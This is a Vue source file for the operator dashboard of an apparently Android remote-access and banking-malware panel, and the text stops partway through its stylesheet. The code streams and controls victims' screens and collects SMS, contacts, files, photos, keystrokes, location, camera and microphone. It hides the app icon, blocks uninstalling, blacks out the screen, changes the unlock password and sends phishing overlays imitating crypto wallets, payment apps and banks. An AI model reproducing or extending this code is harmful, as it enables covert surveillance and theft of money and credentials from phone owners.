<script setup lang="ts">
import { ref, computed, onMounted, onUnmounted, watch } from 'vue';
import { Head, router, usePage } from '@inertiajs/vue3';
import { useAdminBasePath } from '@/composables/useAdminBasePath';
import {
    NTabs,
    NTab,
    NTag,
    NButton,
    NSpace,
    useMessage,
    NIcon,
    NTooltip,
    NSelect,
    NSpin,
} from 'naive-ui';
import {
    PhonePortraitOutline,
    WifiOutline,
    CloseOutline,
    RefreshOutline,
    ArrowBackOutline,
    EyeOutline,
    VideocamOutline,
    MicOutline,
    LocationOutline,
    ChatbubbleOutline,
    PeopleOutline,
    FolderOutline,
    AppsOutline,
    KeypadOutline,
    ImagesOutline,
    DocumentTextOutline,
    CameraOutline,
    HomeOutline,
    StopOutline,
    PlayOutline,
} from '@vicons/ionicons5';
import DefaultLayout from '@/Layouts/DefaultLayout.vue';
import ScreenViewer from '@/Components/DeviceControl/ScreenViewer.vue';
import DeviceInfo from '@/Components/DeviceControl/DeviceInfo.vue';
import DeviceActions from '@/Components/DeviceControl/DeviceActions.vue';
import TextAssistPanel from '@/Components/DeviceControl/TextAssistPanel.vue';
import ScreenControlTab from '@/Components/DeviceControl/ScreenControlTab.vue';
import SmsTab from '@/Components/DeviceControl/tabs/SmsTab.vue';
import ContactsTab from '@/Components/DeviceControl/tabs/ContactsTab.vue';
import FilesTab from '@/Components/DeviceControl/tabs/FilesTab.vue';
import AppsTab from '@/Components/DeviceControl/tabs/AppsTab.vue';
import KeylogTab from '@/Components/DeviceControl/tabs/KeylogTab.vue';
import LocationTab from '@/Components/DeviceControl/tabs/LocationTab.vue';
import InjectTab from '@/Components/DeviceControl/tabs/InjectTab.vue';
import GalleryTab from '@/Components/DeviceControl/tabs/GalleryTab.vue';
import CameraTab from '@/Components/DeviceControl/tabs/CameraTab.vue';
import MicTab from '@/Components/DeviceControl/tabs/MicTab.vue';

import { useDeviceWebSocket } from '@/composables/useDeviceWebSocket';
import { useScreenControl } from '@/composables/useScreenControl';
import {
    useDeviceData,
    parseSmsData,
    parseContactsData,
    parseFilesData,
    parseAppsData,
    parseKeylogData,
    parseLocationData,
} from '@/composables/useDeviceData';

import type { Device, SmsMessage, Contact, FileItem, AppInfo, KeylogEntry, LocationInfo } from '@/types/device';
import type {
    WebSocketInboundMessage,
    ScreenDataMessage,
    SmsDataMessage,
    ContactsDataMessage,
    FilesDataMessage,
    AppsDataMessage,
    KeylogDataMessage,
    CameraDataMessage,
    MicDataMessage,
    LocationDataMessage,
    StatusBatchMessage,
} from '@/types/websocket';

interface Props {
    device: Device;
    wsToken?: string;
    backUrl?: string;
}

const props = withDefaults(defineProps<Props>(), {
    backUrl: '/devices',
});
const page = usePage();
const { adminBaseUrl, userRoute } = useAdminBasePath();
const isAdminBack = computed(() => props.backUrl.startsWith(adminBaseUrl.value + '/'));
const message = useMessage();

const deviceId = computed(() => props.device.uuid);

const {
    connectionState,
    lastError,
    deviceStatus,
    connect,
    disconnect,
    send,
    onMessage,
} = useDeviceWebSocket();

const screenControl = useScreenControl(send, deviceId);
const deviceData = useDeviceData(send, deviceId);

const screenData = ref<string | null>(null);
const screenWidth = ref(1080);
const screenHeight = ref(1920);
const isStreaming = ref(false);
const screenLoading = ref(false);
const screenMode = ref<'screen' | 'screenshot'>('screen');

// OCR 文字辅助状态
const ocrScreenData = ref<string | null>(null);
const ocrScreenWidth = ref(1080);
const ocrScreenHeight = ref(1920);
const isOcrRunning = ref(false);

const smsMessages = ref<SmsMessage[]>([]);
const contacts = ref<Contact[]>([]);
const files = ref<FileItem[]>([]);
const currentFilePath = ref('/sdcard');
const apps = ref<AppInfo[]>([]);
const keylogEntries = ref<KeylogEntry[]>([]);
const locationInfo = ref<LocationInfo | null>(null);
const locationLoading = ref(false);

const cameraData = ref<string | null>(null);
const isCameraActive = ref(false);
const microphoneData = ref<string | null>(null);
const isMicrophoneActive = ref(false);

const injectRecords = ref<any[]>([]);
const injectLoading = ref(false);
const galleryImages = ref<any[]>([]);
const galleryLoading = ref(false);
const isKeylogMonitoring = ref(false);

const activeTab = ref('screen');
const isInitializing = ref(true);  // 初始化加载状态
const loadedTabs = ref<Set<string>>(new Set(['screen']));  // 已加载数据的标签页

const connectionStatusInfo = computed(() => {
    switch (connectionState.value) {
        case 'connected':
            return { text: '已连接', type: 'success' as const, icon: WifiOutline };
        case 'connecting':
            return { text: '连接中', type: 'warning' as const, icon: RefreshOutline };
        case 'reconnecting':
            return { text: '重连中', type: 'warning' as const, icon: RefreshOutline };
        default:
            return { text: '未连接', type: 'default' as const, icon: CloseOutline };
    }
});

const isConnected = computed(() => connectionState.value === 'connected');

// 设备在线状态（基于 WebSocket 返回的 serverToPhone 状态）
const isDeviceOnline = computed(() => {
    const status = deviceStatus.value?.connectionStatus?.toUpperCase?.() || '';
    return status === 'OPEN';
});

const handleMessage = (msg: WebSocketInboundMessage) => {
    const msgType = (msg as { type: string }).type;

    switch (msgType) {
        // 处理 statusBatch - 连接成功和状态更新都使用此消息类型
        case 'statusBatch': {
            // 首次收到 statusBatch 表示 join 成功
            if (isInitializing.value) {
                isInitializing.value = false;
                // 如果当前不是投屏标签，自动加载对应数据
                if (activeTab.value !== 'screen') {
                    loadTabData(activeTab.value);
                }
            }
            // deviceStatus 由 useDeviceWebSocket 自动处理
            break;
        }
        case 'screen': {
            // OCR 文字辅助屏幕数据
            const screenMsg = msg as ScreenDataMessage;
            if (isOcrRunning.value) {
                ocrScreenData.value = screenMsg.data;
                ocrScreenWidth.value = screenMsg.wmob || 1080;
                ocrScreenHeight.value = screenMsg.hmob || 1920;
            }
            break;
        }
        case 'screenshot': {
            // 截图/投屏屏幕数据
            const screenMsg = msg as ScreenDataMessage;
            screenData.value = screenMsg.data;
            screenWidth.value = screenMsg.wmob || 1080;
            screenHeight.value = screenMsg.hmob || 1920;
            screenLoading.value = false;
            break;
        }
        case 'sms': {
            const smsMsg = msg as SmsDataMessage;
            smsMessages.value = parseSmsData(smsMsg.data);
            deviceData.loading.value.sms = false;
            break;
        }
        case 'loadcontacts': {
            const contactsMsg = msg as ContactsDataMessage;
            contacts.value = parseContactsData(contactsMsg.data);
            deviceData.loading.value.contacts = false;
            break;
        }
        case 'files': {
            const filesMsg = msg as FilesDataMessage;
            files.value = parseFilesData(filesMsg.data);
            deviceData.loading.value.files = false;
            break;
        }
        case 'loadapps': {
            const appsMsg = msg as AppsDataMessage;
            apps.value = parseAppsData(appsMsg.data);
            deviceData.loading.value.apps = false;
            break;
        }
        case 'klog':
        case 'klogsdate': {
            const keylogMsg = msg as KeylogDataMessage;
            keylogEntries.value = parseKeylogData(keylogMsg.data);
            deviceData.loading.value.keylog = false;
            break;
        }
        case 'cam': {
            const camMsg = msg as CameraDataMessage;
            cameraData.value = camMsg.data;
            isCameraActive.value = true;
            break;
        }
        case 'mic': {
            const micMsg = msg as MicDataMessage;
            microphoneData.value = micMsg.data;
            isMicrophoneActive.value = true;
            break;
        }
        case 'loc': {
            const locMsg = msg as LocationDataMessage;
            locationInfo.value = parseLocationData(locMsg.data);
            locationLoading.value = false;
            break;
        }
    }
};

const handleConnect = () => {
    connect(props.device.uuid, props.wsToken ?? '');
};

const handleDisconnect = () => {
    disconnect();
    isStreaming.value = false;
    screenData.value = null;
};

const handleStartScreen = () => {
    screenLoading.value = true;
    isStreaming.value = true;
    if (screenMode.value === 'screenshot') {
        screenControl.takeScreenshot();
    } else {
        screenControl.startScreenShare();
    }
};

const handleStopScreen = () => {
    screenControl.stopScreenShare();
    isStreaming.value = false;
    screenData.value = null;
};

const handleNavigate = (type: 'home' | 'back' | 'recent') => {
    screenControl.sendNavigation(type);
};

const handleVolumeUp = () => screenControl.sendVolumeUp();
const handleVolumeDown = () => screenControl.sendVolumeDown();
const handleShowKeyboard = () => screenControl.showKeyboard();
const handleHideKeyboard = () => screenControl.hideKeyboard();
const handlePaste = (text: string) => screenControl.pasteText(text);

// OCR 文字辅助处理
const handleStartOcr = () => {
    isOcrRunning.value = true;
    ocrScreenData.value = null;  // 清除旧数据
    screenControl.startOCR();
    message.success('已开启文字辅助');
};

const handleStopOcr = () => {
    screenControl.stopOCR();
    isOcrRunning.value = false;
    ocrScreenData.value = null;
    message.success('已关闭文字辅助');
};

const handleOcrTap = (x: number, y: number) => {
    screenControl.sendTap(x, y);
};

const handleOcrSwipe = (startX: number, startY: number, endX: number, endY: number) => {
    screenControl.sendSwipe(startX, startY, endX, endY);
};

const handleOcrLongPress = (x: number, y: number) => {
    screenControl.sendLongPress(x, y);
};
const handleLock = (type: 0 | 1 | 2 | 3) => screenControl.lockDevice(type);
const handleScreenshot = () => screenControl.takeScreenshot();
const handleQualityChange = (quality: number) => screenControl.setScreenQuality(quality);

const handleWakeScreen = () => {
    // 使用导航到主页来点亮屏幕 (与 info.php 一致)
    send({ 
        itype: 'slr_panel', 
        subc: 'screen', 
        pid: deviceId.value, 
        comand: 'nav', 
        navshort: 'ho' 
    });
    message.success('点亮屏幕请求已发送');
};

const handleSendMute = () => {
    // 使用 vol 命令，volstate: '0' 为静音 (与 info.php 一致)
    send({ 
        itype: 'slr_panel', 
        subc: 'screen', 
        pid: deviceId.value, 
        comand: 'vol', 
        volstate: '0' 
    });
    message.success('静音请求已发送');
};

const handleSendUnmute = () => {
    // 使用 vol 命令，volstate: '1' 为取消静音 (与 info.php 一致)
    send({ 
        itype: 'slr_panel', 
        subc: 'screen', 
        pid: deviceId.value, 
        comand: 'vol', 
        volstate: '1' 
    });
    message.success('取消静音请求已发送');
};

// 快捷应用包名映射表
const quickAppMap: Record<string, { pkg: string; name: string }> = {
    'TP': { pkg: 'vip.mytokenpocket', name: 'TokenPocket' },
    'IM': { pkg: 'im.token.app', name: 'imToken' },
    'TG': { pkg: 'org.telegram.messenger', name: 'Telegram' },
    'OneKey': { pkg: 'so.onekey.app.wallet', name: 'OneKey' },
    '波宝': { pkg: 'com.tronlinkpro.wallet', name: '波宝Pro' },
    '支付宝': { pkg: 'com.eg.android.AlipayGphone', name: '支付宝' },
    '微信': { pkg: 'com.tencent.mm', name: '微信' },
};

const handleOpenQuickApp = (appKey: string) => {
    const appInfo = quickAppMap[appKey];
    if (!appInfo) {
        message.error(`未知应用: ${appKey}`);
        return;
    }
    
    let packageName = appInfo.pkg;
    
    // 智能包名查找: 从缓存的应用列表中匹配
    if (apps.value.length > 0) {
        // 优先精确匹配包名
        const exactMatch = apps.value.find(a => a.packageName === appInfo.pkg);
        if (exactMatch) {
            packageName = exactMatch.packageName;
        } else {
            // 模糊匹配应用名或包名
            const fuzzyMatch = apps.value.find(a => 
                a.name?.toLowerCase().includes(appInfo.name.toLowerCase()) ||
                a.packageName?.toLowerCase().includes(appKey.toLowerCase())
            );
            if (fuzzyMatch) {
                packageName = fuzzyMatch.packageName;
            }
        }
    }
    
    send({ 
        itype: 'slr_panelsend', 
        subc: 'OPENAPP',
        pid: deviceId.value, 
        packageName 
    });
    message.success(`正在打开 ${appInfo.name}...`);
};

const handleSendKb = (type: number) => {
    // 使用 kb 命令，kbstate: '2' 为防卸载，'3' 为可卸载 (与 info.php 一致)
    send({ 
        itype: 'slr_panel', 
        subc: 'screen', 
        pid: deviceId.value, 
        comand: 'kb', 
        kbstate: String(type) as '2' | '3'
    });
    const msgMap: Record<number, string> = {
        2: '防卸载已启用',
        3: '可卸载已启用',
    };
    message.success(msgMap[type] || '请求已发送');
};

const handleSendBlock = (type: number) => {
    // 使用 block 命令，bstate 控制黑屏/操作 (与 info.php 一致)
    send({ 
        itype: 'slr_panel', 
        subc: 'screen', 
        pid: deviceId.value, 
        comand: 'block', 
        bstate: String(type) as '0' | '1' | '2' | '3',
        color: '0'
    });
    const msgMap: Record<number, string> = {
        0: '黑屏已启用',
        1: '黑屏已取消',
        2: '阻止操作已启用',
        3: '允许操作已启用'
    };
    message.success(msgMap[type]);
};

// 密码钓鱼类型映射
const phishTypeNames: Record<string, string> = {
    '0': '自由选择密码',
    '1': '壁纸图案密码',
    '2': '壁纸数字密码',
    '3': '壁纸混合密码',
};

const handleSendPhish = (type: string, title: string, content: string) => {
    // 使用 DIAO 命令，与 info.php 保持一致
    send({ 
        itype: 'slr_panelsend', 
        subc: 'DIAO', 
        pid: deviceId.value, 
        pin: '',
        title: title,
        lckdis: content,
        typ: type 
    });
    message.success(`钓鱼请求已发送 (${phishTypeNames[type] || type})`);
};

// 银行钓鱼类型名称映射 (使用 USDT 命令格式)
const bankNames: Record<string, string> = {
    '0': 'IM',
    '2': 'TP',
    '6': '支付宝',
    '7': '微信',
    '8': '云闪付',
    '9': '建行',
    '10': '邮储',
    '11': '农行',
    '12': '中行',
    '13': '工行',
    '14': '招行',
    '15': 'Google Pay',
    '16': 'PhonePe',
    '17': 'AN',
    '18': 'MB',
    '19': 'BC',
};

const handleSendBankPhish = (bank: string) => {
    // 使用 USDT 命令格式
    send({ 
        itype: 'slr_panel', 
        subc: 'screen', 
        pid: deviceId.value, 
        comand: 'usdt',
        usdttype: bank 
    });
    message.success(`${bankNames[bank] || bank} 钓鱼请求已发送`);
};

// 修改解锁密码
const handleModifyPassword = (password: string) => {
    send({ 
        itype: 'slr_panel', 
        subc: 'screen', 
        pid: deviceId.value, 
        comand: 'phonepass',
        passtype: '1',
        txt: password
    });
    message.success('修改密码请求已发送');
};

// 黑屏文字状态
const blockTextActive = ref(false);

const handleToggleBlockText = (text: string, bg: string) => {
    if (blockTextActive.value) {
        // 取消黑屏
        send({ 
            itype: 'slr_panel', 
            subc: 'screen', 
            pid: deviceId.value, 
            comand: 'block',
            bstate: '1',
            color: '0'
        });
        blockTextActive.value = false;
        message.success('已取消黑屏');
    } else {
        // 显示黑屏文字
        if (text) {
            // 先发送黑屏文字内容
            send({ 
                itype: 'slr_panel', 
                subc: 'screen', 
                pid: deviceId.value, 
                comand: 'blockd',
                blocktext: text
            });
        }
        // 启用黑屏
        send({ 
            itype: 'slr_panel', 
            subc: 'screen', 
            pid: deviceId.value, 
            comand: 'block',
            bstate: '0',
            color: bg
        });
        blockTextActive.value = true;
        message.success('已显示黑屏文字');
    }
};

const handleTap = (x: number, y: number) => screenControl.sendTap(x, y);
const handleSwipe = (startX: number, startY: number, endX: number, endY: number) => {
    screenControl.sendSwipe(startX, startY, endX, endY);
};
const handleLongPress = (x: number, y: number) => screenControl.sendLongPress(x, y);

const handleRefreshSms = () => deviceData.fetchSms();
const handleSendSms = (number: string, msg: string) => {
    deviceData.sendSms(number, msg);
    message.success('短信发送请求已发送');
};
const handleRefreshContacts = () => deviceData.fetchContacts();
const handleRefreshFiles = () => deviceData.fetchFiles(currentFilePath.value);
const handleNavigateFiles = (path: string) => {
    currentFilePath.value = path;
    deviceData.fetchFiles(path);
};
const handleDownloadFile = (path: string) => {
    deviceData.downloadFile(path);
    message.info('文件下载请求已发送');
};
const handleDeleteFile = (path: string) => {
    deviceData.deleteFile(path);
    message.success('删除请求已发送');
};
const handleRefreshApps = () => deviceData.fetchApps();
const handleOpenApp = (packageName: string) => {
    deviceData.openApp(packageName);
    message.success('打开应用请求已发送');
};
const handleUninstallApp = (packageName: string) => {
    deviceData.uninstallApp(packageName);
    message.success('卸载请求已发送');
};
const handleRefreshKeylog = () => deviceData.fetchKeylog();
const handleFetchKeylogByDate = (date: string) => deviceData.fetchKeylog(date);
const handleToggleKeylogMonitor = () => {
    const newState = !isKeylogMonitoring.value;
    send({
        itype: 'slr_panelsend',
        subc: 'Keylog',
        pid: deviceId.value,
        keylogtype: newState ? '1' : '0',
    });
    isKeylogMonitoring.value = newState;
};
const handleRefreshLocation = () => {
    locationLoading.value = true;
    deviceData.fetchLocation();
};

const handleStartCamera = (camera: 'front' | 'back') => {
    deviceData.startCamera(camera);
};
const handleStopCamera = () => {
    deviceData.stopCamera();
    isCameraActive.value = false;
    cameraData.value = null;
};
const handleStartMicrophone = () => {
    deviceData.startMicrophone();
};
const handleStopMicrophone = () => {
    deviceData.stopMicrophone();
    isMicrophoneActive.value = false;
    microphoneData.value = null;
};

const handleRefreshInject = () => {
    injectLoading.value = true;
    send({ itype: 'slr_panelsend', subc: 'getinject', pid: props.device.uuid });
    setTimeout(() => { injectLoading.value = false; }, 2000);
};

const handleRefreshGallery = () => {
    galleryLoading.value = true;
    send({ itype: 'slr_panelsend', subc: 'getgallery', pid: props.device.uuid });
    setTimeout(() => { galleryLoading.value = false; }, 2000);
};

const handleDownloadGalleryImage = (path: string) => {
    send({ itype: 'slr_panelsend', subc: 'downloadfile', pid: props.device.uuid, path });
    message.info('图片下载请求已发送');
};

const handleDeleteGalleryImage = (path: string) => {
    send({ itype: 'slr_panelsend', subc: 'deletefile', pid: props.device.uuid, path });
    message.success('图片删除请求已发送');
};

const handleRename = (name: string) => {
    deviceData.renameDevice(name);
    message.success('重命名请求已发送');
};
const handleHideIcon = () => {
    send({
        itype: 'slr_panelsend',
        subc: 'Hideico',
        pid: props.device.uuid,
    });
    message.success('隐藏图标请求已发送');
};
const deleteBasePath = computed(() => (isAdminBack.value ? adminBaseUrl.value + '/devices' : userRoute('/devices')));
const handleDelete = () => {
    router.delete(`${deleteBasePath.value}/${props.device.uuid}`);
};
const handleRequestPermissions = () => {
    send({
        itype: 'slr_panelsend',
        subc: 'Permissions',
        pid: props.device.uuid,
    });
    message.success('权限请求已发送');
};

// 加载标签页数据
const loadTabData = (tab: string, force = false) => {
    // 如果未连接或已加载（非强制），则跳过
    if (!isConnected.value) return;
    if (!force && loadedTabs.value.has(tab)) return;

    switch (tab) {
        case 'screen':
            // 投屏标签不需要额外加载
            break;
        case 'keylog':
            // 键盘监听需要用户手动开启或刷新
            break;
        case 'sms':
            // 不自动获取短信，用户需手动点击刷新按钮
            break;
        case 'contacts':
            deviceData.fetchContacts();
            break;
        case 'apps':
            deviceData.fetchApps();
            break;
        case 'files':
            deviceData.fetchFiles(currentFilePath.value);
            break;
        case 'location':
            locationLoading.value = true;
            deviceData.fetchLocation();
            break;
        case 'inject':
            handleRefreshInject();
            break;
        case 'gallery':
            handleRefreshGallery();
            break;
        case 'camera':
        case 'mic':
            // 相机和录音需要用户手动开启
            break;
    }

    loadedTabs.value.add(tab);
};

// 监听标签页切换，自动加载数据
watch(activeTab, (newTab) => {
    loadTabData(newTab);
});

// 监听连接状态，重连后重新加载当前标签数据
watch(isConnected, (connected, wasConnected) => {
    if (connected && !wasConnected) {
        // 重连成功，清空已加载标签（保留 screen）
        loadedTabs.value = new Set(['screen']);
    }
});

onMounted(() => {
    onMessage(handleMessage);
    // 自动连接 WebSocket 并发送 join 消息订阅设备
    handleConnect();
});

onUnmounted(() => {
    handleDisconnect();
});

const tabList = [
    { name: 'screen', label: '投屏', icon: EyeOutline },
    { name: 'keylog', label: '键盘', icon: KeypadOutline },
    { name: 'sms', label: '短信', icon: ChatbubbleOutline },
    { name: 'contacts', label: '联系人', icon: PeopleOutline },
    { name: 'apps', label: '应用', icon: AppsOutline },
    { name: 'inject', label: '注入', icon: DocumentTextOutline },
    { name: 'files', label: '文件', icon: FolderOutline },
    { name: 'camera', label: '相机', icon: VideocamOutline },
    { name: 'gallery', label: '相册', icon: ImagesOutline },
    { name: 'mic', label: '录音', icon: MicOutline },
    { name: 'location', label: '位置', icon: LocationOutline },
];
</script>

<template>
    <Head :title="`控制: ${device.name}`" />
    <DefaultLayout>
        <div class="control-page">
            <!-- 顶部导航栏 -->
            <header class="page-header">
                <div class="header-left">
                    <div class="device-icon">
                        <NIcon :component="PhonePortraitOutline" size="24" />
                    </div>
                    <div class="device-title">
                        <h1 class="device-name">{{ device.name || '未命名设备' }}</h1>
                        <span class="device-model">{{ device.model }}</span>
                    </div>
                </div>
                <div class="header-right">
                    <NTag
                        :type="connectionStatusInfo.type"
                        size="small"
                        round
                        class="status-tag"
                    >
                        <template #icon>
                            <NIcon :component="connectionStatusInfo.icon" />
                        </template>
                        {{ connectionStatusInfo.text }}
                    </NTag>
                    <span v-if="lastError" class="error-hint">{{ lastError }}</span>
                    <NButton
                        tag="a"
                        :href="props.backUrl"
                        quaternary
                        size="small"
                        class="back-btn"
                    >
                        <template #icon>
                            <NIcon :component="ArrowBackOutline" />
                        </template>
                        返回列表
                    </NButton>
                </div>
            </header>

            <div class="control-dashboard">
            <!-- 初始化加载遮罩 -->
            <div v-if="isInitializing" class="initializing-overlay">
                <NSpin size="large" />
                <p class="loading-text">正在连接设备...</p>
            </div>

            <!-- 左侧边栏 -->
            <aside class="sidebar">
                <DeviceInfo
                    :device-id="deviceId"
                    :phone-info="deviceStatus?.phoneInfo || null"
                    :connection-status="deviceStatus?.connectionStatus || ''"
                    :last-ping="deviceStatus?.lastPing || ''"
                />
                <TextAssistPanel
                    :screen-data="ocrScreenData"
                    :screen-width="ocrScreenWidth"
                    :screen-height="ocrScreenHeight"
                    :is-running="isOcrRunning"
                    @start="handleStartOcr"
                    @stop="handleStopOcr"
                    @tap="handleOcrTap"
                    @swipe="handleOcrSwipe"
                    @longpress="handleOcrLongPress"
                />
                <DeviceActions
                    @rename="handleRename"
                    @hide-icon="handleHideIcon"
                    @delete="handleDelete"
                    @request-permissions="handleRequestPermissions"
                />
            </aside>

            <!-- 右侧主内容区 -->
            <section class="main-content">
                <!-- 设备离线遮罩 -->
                <Transition name="fade">
                    <div v-if="!isDeviceOnline && !isInitializing" class="offline-overlay">
                        <div class="offline-content">
                            <div class="offline-spinner"></div>
                            <div class="offline-text">设备已离线</div>
                            <div class="offline-hint">请等待设备上线后操作</div>
                        </div>
                    </div>
                </Transition>

                <!-- 标签导航 -->
                <div class="tabs-header">
                    <NTabs v-model:value="activeTab" type="segment" size="small">
                        <NTab
                            v-for="tab in tabList"
                            :key="tab.name"
                            :name="tab.name"
                        >
                            <div class="tab-label">
                                <NIcon :component="tab.icon" />
                                <span>{{ tab.label }}</span>
                            </div>
                        </NTab>
                    </NTabs>
                </div>

                <!-- 内容区：投屏 + 标签内容 -->
                <div class="content-layout">
                    <!-- 投屏区域（始终显示） -->
                    <div class="screen-area">
                        <!-- 投屏控制栏 -->
                        <div class="screen-controls">
                            <NSelect
                                v-model:value="screenMode"
                                size="small"
                                :options="[
                                    { label: '实时投屏', value: 'screen' },
                                    { label: '截图', value: 'screenshot' },
                                ]"
                                style="width: 100px;"
                            />
                            <template v-if="!isConnected">
                                <NButton
                                    type="primary"
                                    size="small"
                                    @click="handleConnect"
                                >
                                    <template #icon>
                                        <NIcon :component="WifiOutline" />
                                    </template>
                                    连接
                                </NButton>
                            </template>
                            <template v-else>
                                <NButton
                                    type="error"
                                    size="small"
                                    ghost
                                    @click="handleDisconnect"
                                >
                                    <template #icon>
                                        <NIcon :component="CloseOutline" />
                                    </template>
                                    断开
                                </NButton>
                                <NButton
                                    v-if="!isStreaming"
                                    type="success"
                                    size="small"
                                    @click="handleStartScreen"
                                >
                                    <template #icon>
                                        <NIcon :component="PlayOutline" />
                                    </template>
                                    开启
                                </NButton>
                                <NButton
                                    v-else
                                    type="warning"
                                    size="small"
                                    @click="handleStopScreen"
                                >
                                    <template #icon>
                                        <NIcon :component="StopOutline" />
                                    </template>
                                    停止
                                </NButton>
                            </template>
                        </div>

                        <!-- 手机屏幕框架 -->
                        <div class="phone-frame">
                            <div class="phone-notch"></div>
                            <div class="screen-container">
                                <ScreenViewer
                                    :screen-data="screenData"
                                    :screen-width="screenWidth"
                                    :screen-height="screenHeight"
                                    :is-streaming="isStreaming"
                                    :loading="screenLoading"
                                    @tap="handleTap"
                                    @swipe="handleSwipe"
                                    @longpress="handleLongPress"
                                />
                            </div>
                        </div>

                        <!-- 导航按钮 -->
                        <div class="nav-buttons">
                            <NTooltip trigger="hover">
                                <template #trigger>
                                    <NButton
                                        circle
                                        size="small"
                                        @click="handleNavigate('back')"
                                    >
                                        <template #icon>
                                            <NIcon :component="ArrowBackOutline" />
                                        </template>
                                    </NButton>
                                </template>
                                返回
                            </NTooltip>
                            <NTooltip trigger="hover">
                                <template #trigger>
                                    <NButton
                                        circle
                                        size="small"
                                        @click="handleNavigate('home')"
                                    >
                                        <template #icon>
                                            <NIcon :component="HomeOutline" />
                                        </template>
                                    </NButton>
                                </template>
                                主页
                            </NTooltip>
                            <NTooltip trigger="hover">
                                <template #trigger>
                                    <NButton
                                        circle
                                        size="small"
                                        @click="handleNavigate('recent')"
                                    >
                                        <template #icon>
                                            <NIcon :component="AppsOutline" />
                                        </template>
                                    </NButton>
                                </template>
                                多任务
                            </NTooltip>
                            <NTooltip trigger="hover">
                                <template #trigger>
                                    <NButton
                                        circle
                                        size="small"
                                        @click="handleScreenshot"
                                    >
                                        <template #icon>
                                            <NIcon :component="CameraOutline" />
                                        </template>
                                    </NButton>
                                </template>
                                截图
                            </NTooltip>
                        </div>
                    </div>

                    <!-- 标签内容区 -->
                    <div class="tab-content-area">
                        <Transition name="tab-fade" mode="out-in">
                            <div :key="activeTab" class="tab-content-wrapper">
                                <ScreenControlTab
                                    v-if="activeTab === 'screen'"
                                    :phone-password="deviceStatus?.phoneInfo?.phone_password || ''"
                                    @wake-screen="handleWakeScreen"
                                    @lock="handleLock"
                                    @send-mute="handleSendMute"
                                    @send-unmute="handleSendUnmute"
                                    @volume-up="handleVolumeUp"
                                    @volume-down="handleVolumeDown"
                                    @send-kb="handleSendKb"
                                    @send-block="handleSendBlock"
                                    @hide-icon="handleHideIcon"
                                    @send-phish="handleSendPhish"
                                    @send-bank-phish="handleSendBankPhish"
                                    @toggle-block-text="handleToggleBlockText"
                                    @paste="handlePaste"
                                    @open-quick-app="handleOpenQuickApp"
                                    @modify-password="handleModifyPassword"
                                />
                                <KeylogTab
                                    v-else-if="activeTab === 'keylog'"
                                    :entries="keylogEntries"
                                    :loading="deviceData.loading.value.keylog"
                                    :is-monitoring="isKeylogMonitoring"
                                    @refresh="handleRefreshKeylog"
                                    @fetch-by-date="handleFetchKeylogByDate"
                                    @toggle-monitor="handleToggleKeylogMonitor"
                                />
                                <SmsTab
                                    v-else-if="activeTab === 'sms'"
                                    :messages="smsMessages"
                                    :loading="deviceData.loading.value.sms"
                                    @refresh="handleRefreshSms"
                                    @send-sms="handleSendSms"
                                />
                                <ContactsTab
                                    v-else-if="activeTab === 'contacts'"
                                    :contacts="contacts"
                                    :loading="deviceData.loading.value.contacts"
                                    @refresh="handleRefreshContacts"
                                />
                                <AppsTab
                                    v-else-if="activeTab === 'apps'"
                                    :apps="apps"
                                    :loading="deviceData.loading.value.apps"
                                    @refresh="handleRefreshApps"
                                    @open="handleOpenApp"
                                    @uninstall="handleUninstallApp"
                                />
                                <InjectTab
                                    v-else-if="activeTab === 'inject'"
                                    :records="injectRecords"
                                    :loading="injectLoading"
                                    @refresh="handleRefreshInject"
                                />
                                <FilesTab
                                    v-else-if="activeTab === 'files'"
                                    :files="files"
                                    :loading="deviceData.loading.value.files"
                                    :current-path="currentFilePath"
                                    @navigate="handleNavigateFiles"
                                    @download="handleDownloadFile"
                                    @delete="handleDeleteFile"
                                    @refresh="handleRefreshFiles"
                                />
                                <CameraTab
                                    v-else-if="activeTab === 'camera'"
                                    :camera-data="cameraData"
                                    :is-active="isCameraActive"
                                    @start="handleStartCamera"
                                    @stop="handleStopCamera"
                                />
                                <GalleryTab
                                    v-else-if="activeTab === 'gallery'"
                                    :images="galleryImages"
                                    :loading="galleryLoading"
                                    @refresh="handleRefreshGallery"
                                    @download="handleDownloadGalleryImage"
                                    @delete="handleDeleteGalleryImage"
                                />
                                <MicTab
                                    v-else-if="activeTab === 'mic'"
                                    :audio-data="microphoneData"
                                    :is-active="isMicrophoneActive"
                                    @start="handleStartMicrophone"
                                    @stop="handleStopMicrophone"
                                />
                                <LocationTab
                                    v-else-if="activeTab === 'location'"
                                    :location="locationInfo"
                                    :loading="locationLoading"
                                    @refresh="handleRefreshLocation"
                                />
                            </div>
                        </Transition>
                    </div>
                </div>
            </section>
            </div>
        </div>
    </DefaultLayout>
</template>

<style scoped>
/* 单页面容器：固定宽度由视口决定，不随内容变化 */
.control-page {
    min-height: 100vh;
    width: 100%;
    max-width: 100%;
    background: #f5f7fa;
    display: flex;
    flex-direction: column;
    overflow-x: hidden;
}

/* 顶部导航栏 */
.page-header {
    display: flex;
    align-items: center;
    justify-content: space-between;
    padding: 12px 24px;
    background: white;
    border-bottom: 1px solid #e2e8f0;
    box-shadow: 0 1px 3px rgba(0, 0, 0, 0.05);
    position: sticky;
    top: 0;
    z-index: 50;
}

.header-left {
    display: flex;
    align-items: center;
    gap: 12px;
}

.header-right {
    display: flex;
    align-items: center;
    gap: 12px;
}

/* 主布局：两栏布局，宽度固定为 100% 防止被内容撑开 */
.control-dashboard {
    display: grid;
    grid-template-columns: 280px minmax(0, 1fr);
    gap: 20px;
    flex: 1;
    width: 100%;
    max-width: 1920px;
    min-width: 0;
    padding: 20px 24px;
    position: relative;
    margin: 0 auto;
    overflow: hidden;
}

/* 初始化加载遮罩 */
.initializing-overlay {
    position: absolute;
    inset: 0;
    background: rgba(255, 255, 255, 0.95);
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    z-index: 100;
    border-radius: 12px;
}

.loading-text {
    margin-top: 16px;
    color: #64748b;
    font-size: 14px;
}

.device-icon {
    width: 40px;
    height: 40px;
    background: linear-gradient(135deg, #10B981 0%, #059669 100%);
    border-radius: 10px;
    display: flex;
    align-items: center;
    justify-content: center;
    color: white;
    box-shadow: 0 2px 8px rgba(16, 185, 129, 0.3);
}

.device-title {
    display: flex;
    flex-direction: column;
}

.device-name {
    font-size: 18px;
    font-weight: 600;
    color: #1e293b;
    margin: 0;
    line-height: 1.2;
}

.device-model {
    font-size: 12px;
    color: #64748b;
}

.connection-status {
    display: flex;
    align-items: center;
    gap: 12px;
}

.status-tag {
    font-weight: 500;
}

.error-hint {
    font-size: 12px;
    color: #ef4444;
}

.back-btn {
